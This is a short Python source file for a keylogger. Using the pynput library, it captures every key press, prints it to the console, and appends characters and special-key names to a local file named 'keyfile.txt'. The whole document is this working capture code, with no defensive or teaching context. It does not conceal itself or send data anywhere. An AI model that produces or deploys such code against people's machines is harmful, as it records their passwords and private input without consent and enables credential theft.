from pynput import keyboard
import os
import sys

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            if key.char:  # Check if the key has a character representation
                logKey.write(key.char)
        except AttributeError:
            # Handle special keys like Shift, Ctrl, etc.
            logKey.write(f'[{key}]')

def on_press(key):
    keyPressed(key)

def main():
    # Set up the listener
    with keyboard.Listener(on_press=on_press) as listener:
        # Run the listener in the background
        listener.join()

if __name__ == "__main__":
    # Run the main function
    main()
